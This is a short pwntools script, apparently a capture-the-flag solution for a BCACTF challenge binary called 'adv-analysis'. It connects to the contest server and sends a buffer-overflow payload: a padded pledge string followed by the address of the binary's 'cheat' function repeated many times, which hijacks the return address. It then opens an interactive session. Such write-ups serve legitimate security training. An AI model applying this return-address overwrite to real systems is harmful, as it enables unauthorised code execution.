from pwn import *
exe = ELF("./adv-analysis_patched")
context.binary = exe
def conn():
    r = process([exe.path])
    return r
def main():
    r = remote("bin.bcactf.com", 49156)
    r.sendline(b"i pledge to not cheat\x00".ljust(0x20, p8(0)) + p64(exe.sym['cheat'])*0x50)
    r.interactive()

if __name__ == "__main__":
    main()
